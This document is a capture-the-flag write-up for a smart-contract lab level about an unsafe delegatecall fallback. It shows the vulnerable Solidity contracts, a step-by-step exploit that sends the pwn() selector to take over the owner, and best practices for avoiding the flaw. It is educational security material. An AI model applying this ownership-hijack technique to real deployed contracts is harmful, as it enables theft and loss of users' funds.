# Level 6: Delegation

**Difficulty:** Easy

**Vulnerability:** Unsafe delegatecall forwarding lets an attacker hijack the calling contract's storage

## How it Works

There are two contracts in this level. `Delegate` holds the logic including a `pwn()` function that sets `owner` to whoever calls it. `Delegation` is the main contract that actually holds the `owner` I need to take over.

```solidity
contract Delegate {
    address public owner;  // slot 0

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;  // slot 0
    Delegate delegate;     // slot 1

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

The key is `delegatecall`. When `Delegation` calls into `Delegate` using `delegatecall`, it borrows `Delegate`'s code but runs it inside `Delegation`'s own context. That means any storage writes happen to `Delegation`'s storage, not `Delegate`'s. Since both contracts have `owner` at slot 0, when `pwn()` writes `owner = msg.sender`, it is actually writing to `Delegation`'s `owner`.

The second piece is the `fallback` function. It fires whenever someone calls `Delegation` with a function selector it does not recognise. It then forwards the raw `msg.data` directly into the `delegatecall`. So if I send the selector for `pwn()` to `Delegation`, the fallback fires and forwards it to `Delegate.pwn()` via `delegatecall`.

## Exploit Steps

1. Get the function selector for `pwn()`:
```js
web3.utils.keccak256("pwn()").slice(0, 10)
// "0xdd365b8b"
```

A function selector is the first 4 bytes of the keccak256 hash of the function signature. The EVM uses these 4 bytes to decide which function to route a call to. `.slice(0, 10)` gives me `0x` plus 8 hex characters, which equals 4 bytes.

2. Send a transaction to `Delegation` with the `pwn()` selector as `msg.data`:
```js
await sendTransaction({
    from: player,
    to: instance,
    data: web3.utils.keccak256("pwn()").slice(0, 10)
})
```

`Delegation` does not have a `pwn()` function, so the EVM falls through to `fallback()`. The fallback forwards my `msg.data` into `delegatecall`. `pwn()` runs in `Delegation`'s context, `msg.sender` is me, and `Delegation`'s `owner` is set to my address.

3. Verify:
```js
await contract.owner()
// returns player address
```

4. Submit the instance.

## Key Takeaway

`delegatecall` lets a contract borrow code from another contract, but all storage reads and writes happen on the calling contract. This is powerful for things like upgradeable proxy patterns, but it means the called contract has full access to the caller's storage.

The danger here is that `Delegation` blindly forwards any `msg.data` it receives into a `delegatecall`. There is no check on which function is being called. An attacker can choose exactly what logic runs against `Delegation`'s storage.

The Parity wallet hack in 2017 exploited this same idea. An attacker called an unprotected `initWallet()` function directly on the implementation contract, made themselves owner, then called `kill()` to self-destruct it. Every wallet that delegated to that implementation became permanently bricked — the ETH locked inside could never be moved again.

Best practices for using `delegatecall` safely:

1. Only `delegatecall` to trusted, hardcoded addresses — never to user-supplied ones
2. The storage layout (slot order) of both contracts must match exactly, otherwise writes land in the wrong slots silently
3. Never expose unprotected initialiser functions on implementation contracts
4. Use audited proxy patterns like OpenZeppelin's instead of writing delegatecall logic from scratch

**Vulnerability category:** Delegatecall / Access Control
